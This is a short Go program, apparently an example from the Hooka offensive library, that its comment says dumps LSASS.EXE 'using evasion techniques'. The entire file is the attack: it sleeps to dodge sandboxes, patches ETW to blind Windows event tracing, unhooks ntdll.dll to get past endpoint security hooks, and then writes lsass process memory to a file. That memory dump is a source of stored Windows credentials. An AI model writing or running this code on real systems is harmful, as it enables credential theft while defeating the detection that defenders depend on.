package main

import (
  "fmt"
  "log"
  "github.com/D3Ext/Hooka/pkg/hooka"
)

// this is an example of a program to dump the LSASS.EXE process using evasion techniques
func main(){
  fmt.Println("[*] Sleeping")
  hooka.Sleep()

  fmt.Println("[*] Patching ETW")
  err := hooka.PatchEtw()
  if err != nil {
    log.Fatal(err)
  }

  fmt.Println("[*] Unhooking ntdll.dll")
  err = hooka.PerunsUnhook()
  if err != nil {
    log.Fatal(err)
  }

  fmt.Println("[*] Sleeping")
  hooka.Sleep()

  fmt.Println("[*] Dumping lsass.exe process")
  err = hooka.DumpLsass("dump.tmpº")
  if err != nil {
    log.Fatal(err)
  }

  fmt.Println("[+] Success!")
}


